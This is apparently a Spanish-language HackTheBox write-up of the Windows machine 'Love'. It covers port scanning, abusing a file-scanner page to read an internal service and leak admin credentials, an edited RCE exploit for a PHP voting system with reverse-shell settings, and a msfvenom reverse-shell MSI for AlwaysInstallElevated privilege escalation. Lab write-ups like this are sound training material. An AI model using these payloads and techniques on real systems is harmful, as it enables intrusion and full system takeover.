---
layout      : post
title       : "Love - HackTheBox"
author      : elc4br4
image       : assets/images/HTB/Love-HackTheBox/Love.webp
category    : [ htb ]
tags        : [ Windows ]
---

Estamos ante una máquina Windows nivel Easy en la que encontraremos credenciales, tendremos que explotar RCE y jugar un poco con registros y msfvenom... 🙈​☺️​

![](/assets/images/HTB/Love-HackTheBox/rating-love.png)

[![HTBadge](https://www.hackthebox.eu/badge/image/533771)](https://www.hackthebox.com/home/users/profile/533771)



# Reconocimiento puertos

El escaneo nmap nos reporta la siguiente información.

```bash
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
```

 A través de la función extractPorts de s4vitar copiaré rápidamente los puertos para el posterior escaneo.

```extractPorts
❱ extractPorts scan1
[*] Extracting information...

    [*] IP Address: 10.10.10.239
    [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670

[*] Ports copied to clipboard
```

Os dejo por aquí la función extractPorts que debéis añadir en vuestro archivo .zshrc o .bashrc

![](/assets/images/HTB/Love-HackTheBox/extractports.png)

Y realizamos el segundo escaneo, un escaneo mucho más detallado con los servicios en ejecución y demás información.

```bash
❯ nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sCV 10.10.10.239 -oN scan2
```

Que nos reporta la siguiente información.

```bash
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/htApache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)tp     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host '10.10.14.2' is not allowed to connect to this MariaDB server
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-09-12T12:22:53+00:00; +21m33s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
SF-Port3306-TCP:V=7.92%I=7%D=9/12%Time=631F1EDB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,49,"E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.2'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m33s, deviation: 3h30m01s, median: 21m32s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-12T12:22:38
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-09-12T05:22:34-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

A continuación extraigo la información más relevante del escaneo que es la que usaremos a lo largo del CTF

| PUERTO | SERVICIO | VERSIÓN |
| ------ | -------- | ------- |
| 80     | HTTP     | Apache httpd 2.4.46 OpenSSL/1.1.1J PHP/7.3.27 |
| 43     | HTTPS    | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |
| 445    | SMB      | microsoft-ds Windows 10 Pro 19042 | 
| 5000   | HTTP     | Apache httpd 2.4.46 OpenSSL/1.1.1j PHP/7.3.27 |



Y también he encontrado lo siguiente:

**Un vhost --> staging.love.htb**

Lo añadimos al archivo hosts de nuestra máquina atacante y proseguimos.


# Enumeración 

Tras mirar el vhost love.htb no veo nada interesante más que un login y poco más.


![](/assets/images/HTB/Love-HackTheBox/web1.png)


Pruebo credenciales por defecto y me arroja el mensaje *"Cannot find voter with the ID"*


Pero pruebo a buscar exploits para este servicio *"Voting System"*


![](/assets/images/HTB/Love-HackTheBox/searchsploit.png)


Como vemos hay uno que no requiere de credenciales pero lo pruebo y finalmente si me pide credenciales, asique debemos obtener credenciales...


Me dirijo a visitar el otro vhost que encontramos en el escaneo nmap.


![](/assets/images/HTB/Love-HackTheBox/web2.png)

Estamos ante una web que su función es escanear archivos en busca de malware.

Si nos dirigimos al apartado *"Demo"*, tenemos un campo donde podemos introducir una url o archivo para escanear.


Pruebo a intentar establecer una conexión con netcat de la siguiente forma para ver si logramos cierta comunicación.

```bash
❯ sudo netcat -lnvp 80
[sudo] password for elc4br4: 
listening on [any] 80 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.239] 55752
GET / HTTP/1.1
Host: 10.10.14.2
Accept: */*
```

Tenemos respuesta pero es no es suficiente...

Pruebo a ver que rutas tenemos en el servidor web y a cuáles tenemos acceso.


![](/assets/images/HTB/Love-HackTheBox/gobuster.png)


Tras el escaneo de rutas descubro ciertas carpetas y archivos y se me ocurre probar algo... Podríamos escanear algunos de los archivos internos del servidor web, por ejemplo el index...?

![](/assets/images/HTB/Love-HackTheBox/web3.png)

Como vemos ha interpretado el archivo index.php... hmmmm

Además de eso he recordado que teníamos en el puerto 5000 otro servidor web, intento acceder pero me arroja el siguiente mensaje:

**You don't have permission to acces this resource**

¿Y si probamos a acceder al mismo a través del escaner de archivos? Ya que hemos visto que interpreta el lenguaje PHP...

Probemos... y ... BINGOOO!!!!

![](/assets/images/HTB/Love-HackTheBox/web4.png)

Tenemos unas credenciales!!!

**Vote Admin Creds -->  admin:@LoveIsInTheAir!!!!**


Podríamos intentar loguearnos en el panel del primer dominio... **"love.htb"**

Pero antes de nada recuerdo que anteriormente encontramos varios exploits para obtener RCE (Remote Code Execution), asique procedo a descargar el exploit.

![](/assets/images/HTB/Love-HackTheBox/exploitdb.png)

Tuve un problema con el exploit, y tuve que editarlo.

Os dejo por aquí el archivo ya editado, y las líneas que debéis editar en caso de no usar el mío.

[RCE.py](/assets/scripts/HTB/Love/RCE.py)


```exploit
# --- Edit your settings here ----

IP = "www.love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.2" # Reverse shell IP
REV_PORT = "4444" # Reverse port

# --------------------------------
  
INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```

Ejecutamos netcat en el puerto configurado y lanzamos el exploit, también podría realizarse manualmente mediante la subida al servidor de una imágen a través del panel web.

Una vez dentro ya podremos leer el archivo user.txt

# Escalada de Privilegios

Una vez obtenemos acceso al sistema, estamos logueados como el usuario phoebe.

```powershell
C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe
```

Para escalar uso diferentes técnicas de enumeración...

```windows
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```


[https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/)

`Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`


Existen diferentes métodos, yo mostraré uno usando msfconsole

Creamos un archivo msi con msfconsole


```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.2 lport=1234 -f msi -o rev.msi
```
 Lo subimos a la carpeta C:\Adminstration con ayuda del servidor de python

Y lo ejecutamos tras poner el netcat en escucha en el puerto configurado.

```netcat
❯ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.239] 58212
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

![](/assets/images/HTB/Love-HackTheBox/hacker-cat.gif)
